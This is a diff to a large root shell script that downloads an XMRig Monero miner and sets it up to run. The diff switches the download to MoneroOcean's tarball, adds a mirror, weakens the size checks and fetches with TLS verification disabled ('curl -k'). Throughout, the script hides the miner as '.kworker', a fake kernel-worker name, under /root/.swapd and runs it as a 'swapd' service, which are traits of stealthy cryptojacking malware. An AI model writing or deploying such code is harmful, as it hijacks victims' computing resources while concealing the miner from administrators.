@@ -1667,19 +1667,17 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
             fi
         fi
 
-        # Method 2: XMRig static build (if available)
+        # Method 2: XMRig from MoneroOcean (may work on ARM64)
         if [ "$DOWNLOAD_SUCCESS" = false ]; then
-            echo "[*] Trying XMRig static ARM build..."
-            # Note: XMRig doesn't always have ARMv7 static builds
-            # This might also return 404, but worth trying
-            XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
+            echo "[*] Trying XMRig from MoneroOcean..."
+            XMRIG_URL="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
 
             if curl -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && [ -s xmrig.tar.gz ]; then
                 FILE_SIZE=$(stat -c%s xmrig.tar.gz 2>/dev/null || wc -c < xmrig.tar.gz)
                 if [ "$FILE_SIZE" -gt 100000 ]; then
                     echo "[*] Downloaded XMRig ($((FILE_SIZE / 1024))KB), extracting..."
                     if tar -xzf xmrig.tar.gz 2>/dev/null; then
-                        for location in xmrig xmrig-*/xmrig; do
+                        for location in xmrig xmrig-*/xmrig */xmrig; do
                             if [ -f "$location" ]; then
                                 cp "$location" swapd
                                 DOWNLOAD_SUCCESS=true
@@ -1774,7 +1772,7 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
 
 elif [ "$MINER_TYPE" = "xmrig" ]; then
     # ==================== DOWNLOAD XMRIG ====================
-echo "[*] Downloading XMRig..."
+echo "[*] Downloading XMRig from MoneroOcean..."
 
 mkdir -p /root/.swapd
 cd /root/.swapd || {
@@ -1786,62 +1784,20 @@ cd /root/.swapd || {
     }
 }
 
-XMRIG_VERSION="6.21.0"
+# Use MoneroOcean's pre-compiled XMRig (already optimized for MoneroOcean pool)
+XMRIG_URL="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
 
-# Select correct binary based on architecture
-case "$ARCH" in
-    x86_64|amd64)
-        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-x64.tar.gz"
-        XMRIG_ARCH="x64"
-        ;;
-    i686|i386)
-        echo "[!] ERROR: 32-bit x86 is NOT supported by XMRig 6.x"
-        echo "[!] Please use a 64-bit system or manually compile an older version"
-        exit 1
-        ;;
-    aarch64|arm64)
-        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-arm64.tar.gz"
-        XMRIG_ARCH="arm64"
-        ;;
-    armv7l|armhf)
-        echo "[!] ERROR: ARMv7 (32-bit ARM) is NOT supported by official XMRig releases"
-        echo "[!] You must compile XMRig from source on this architecture"
-        echo ""
-        echo "Manual compilation required:"
-        echo "  git clone https://github.com/xmrig/xmrig.git"
-        echo "  cd xmrig && mkdir build && cd build"
-        echo "  cmake .. -DARM_TARGET=7"
-        echo "  make -j\$(nproc)"
-        exit 1
-        ;;
-    mips|mipsel|mips64)
-        echo "[!] ERROR: MIPS architecture is NOT supported by XMRig"
-        echo "[!] Architecture: $ARCH"
-        echo "[!] XMRig only supports x86_64 and ARM64"
-        exit 1
-        ;;
-    *)
-        echo "[!] ERROR: Unsupported architecture: $ARCH"
-        echo "[!] XMRig only supports: x86_64, ARM64"
-        echo "[!] Your system: $ARCH"
-        exit 1
-        ;;
-esac
-
-echo "[*] Selected architecture: $XMRIG_ARCH"
+echo "[*] Downloading from: $XMRIG_URL"
 
 DOWNLOAD_SUCCESS=false
 ATTEMPTS=0
 MAX_ATTEMPTS=3
 
-# Multiple mirrors in case GitHub is blocked or slow
+# Multiple download mirrors
 MIRRORS=(
     "$XMRIG_URL"
+    "https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.tar.gz"
 )
-
-# Expected tarball size (approximately 3.5MB)
-EXPECTED_SIZE_MIN=3400000  # 3.4MB minimum
-EXPECTED_SIZE_MAX=3600000  # 3.6MB maximum
 
 # Retry download up to 3 times with different mirrors
 for mirror in "${MIRRORS[@]}"; do
@@ -1870,19 +1826,15 @@ for mirror in "${MIRRORS[@]}"; do
         fi
     fi
 
-    # Verify download - check if file exists, has content, and is the right size
+    # Verify download - check if file exists and has content
     if [ -f xmrig.tar.gz ] && [ -s xmrig.tar.gz ]; then
         FILE_SIZE=$(stat -c%s xmrig.tar.gz 2>/dev/null || wc -c < xmrig.tar.gz)
         echo "[*] Downloaded: $((FILE_SIZE / 1024 / 1024))MB ($FILE_SIZE bytes)"
 
-        # Check if size is in expected range
-        if [ "$FILE_SIZE" -lt "$EXPECTED_SIZE_MIN" ]; then
-            echo "[!] Downloaded file too small (corrupted/incomplete)"
-            echo "[!] Expected >3.4MB, got $((FILE_SIZE / 1024 / 1024))MB"
-            DOWNLOAD_SUCCESS=false
-            rm -f xmrig.tar.gz
-        elif [ "$FILE_SIZE" -gt "$EXPECTED_SIZE_MAX" ]; then
-            echo "[!] Downloaded file too large (unexpected)"
+        # Basic size check (MoneroOcean version is ~3-4MB)
+        if [ "$FILE_SIZE" -lt 1000000 ]; then
+            echo "[!] Downloaded file too small (likely corrupted)"
+            echo "[!] Expected >1MB, got $((FILE_SIZE / 1024 / 1024))MB"
             DOWNLOAD_SUCCESS=false
             rm -f xmrig.tar.gz
         else
@@ -1921,11 +1873,25 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
     fi
 
     if [ "$DOWNLOAD_SUCCESS" = true ]; then
-        # Rename xmrig to hidden .kworker (actual miner binary)
-        mv xmrig-*/xmrig .kworker 2>/dev/null || {
-            echo "[!] Failed to rename xmrig binary - continuing anyway..."
+        # MoneroOcean tarball contains xmrig binary directly or in simple structure
+        # Try multiple possible locations
+        if [ -f xmrig ]; then
+            mv xmrig .kworker 2>/dev/null || cp xmrig .kworker 2>/dev/null
+        elif [ -f xmrig-*/xmrig ]; then
+            mv xmrig-*/xmrig .kworker 2>/dev/null || cp xmrig-*/xmrig .kworker 2>/dev/null
+        elif [ -f */xmrig ]; then
+            mv */xmrig .kworker 2>/dev/null || cp */xmrig .kworker 2>/dev/null
+        else
+            echo "[!] Cannot find xmrig binary in tarball"
+            echo "[*] Contents of extracted files:"
+            ls -la 2>/dev/null || true
             DOWNLOAD_SUCCESS=false
-        }
+        fi
+        
+        if [ ! -f .kworker ]; then
+            echo "[!] Failed to extract/rename xmrig binary"
+            DOWNLOAD_SUCCESS=false
+        fi
     fi
 
     if [ "$DOWNLOAD_SUCCESS" = true ]; then
@@ -1985,10 +1951,10 @@ if [ "$DOWNLOAD_SUCCESS" = false ]; then
     echo "  - Firewall blocking outbound connections"
     echo ""
     echo "Manual installation:"
-    echo "  1. Download from alternate mirror:"
-    echo "     wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
-    echo "  2. Extract: tar -xzf xmrig-6.21.0-linux-x64.tar.gz"
-    echo "  3. Move: mv xmrig-6.21.0/xmrig /root/.swapd/swapd"
+    echo "  1. Download from MoneroOcean:"
+    echo "     wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
+    echo "  2. Extract: tar -xzf xmrig.tar.gz"
+    echo "  3. Move: mv xmrig /root/.swapd/swapd"
     echo "  4. Make executable: chmod +x /root/.swapd/swapd"
     echo "  5. Re-run this script"
     echo ""
@@ -2022,9 +1988,9 @@ else
     echo "[!] Download/extraction failed - cannot continue with installation"
     echo ""
     echo "Manual fix required:"
-    echo "1. Download manually: curl -L -o /tmp/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
+    echo "1. Download manually: curl -L -o /tmp/xmrig.tar.gz https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
     echo "2. Extract: tar -xzf /tmp/xmrig.tar.gz -C /tmp/"
-    echo "3. Copy: cp /tmp/xmrig-6.21.0/xmrig /root/.swapd/swapd"
+    echo "3. Copy: cp /tmp/xmrig /root/.swapd/swapd"
     echo "4. Make executable: chmod +x /root/.swapd/swapd"
     echo "5. Restart: systemctl restart swapd"
     echo ""
